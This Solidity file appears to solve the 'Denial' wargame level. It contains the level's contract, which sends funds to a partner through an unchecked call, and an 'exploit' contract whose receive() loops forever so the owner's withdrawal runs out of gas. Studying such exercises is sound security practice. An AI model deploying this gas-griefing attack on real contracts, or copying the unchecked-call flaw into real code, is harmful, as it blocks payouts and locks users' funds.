// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Denial {
    address public partner; // withdrawal partner - pay the gas, split the withdraw
    address public constant owner = address(0xA9E);
    uint256 timeLastWithdrawn;
    mapping(address => uint256) withdrawPartnerBalances; // keep track of partners balances

    function setWithdrawPartner(address _partner) public {
        partner = _partner;
    }

    // withdraw 1% to recipient and 1% to owner
    function withdraw() public {
        uint256 amountToSend = address(this).balance / 100;
        // perform a call without checking return
        // The recipient can revert, the owner will still get their share
        partner.call{value: amountToSend}("");
        payable(owner).transfer(amountToSend);
        // keep track of last withdrawal time
        timeLastWithdrawn = block.timestamp;
        withdrawPartnerBalances[partner] += amountToSend;
    }

    /**
    10**15 -> 10**13
     */

    // allow deposit of funds
    receive() external payable {}

    // convenience function
    function contractBalance() public view returns (uint256) { // 0.001 ether start
        return address(this).balance;
    }
}

// instance address: 0x6Db46Bc29174950e6994772090317A855e4F7ED0

contract exploit {
    Denial target = Denial(payable(0xd9Ba21F7B66A045ef501822dB3c86ec34D10a423));
    
    constructor() {
        target.setWithdrawPartner(address(this));
    }

    receive() external payable {
        while (true) {}
    }
}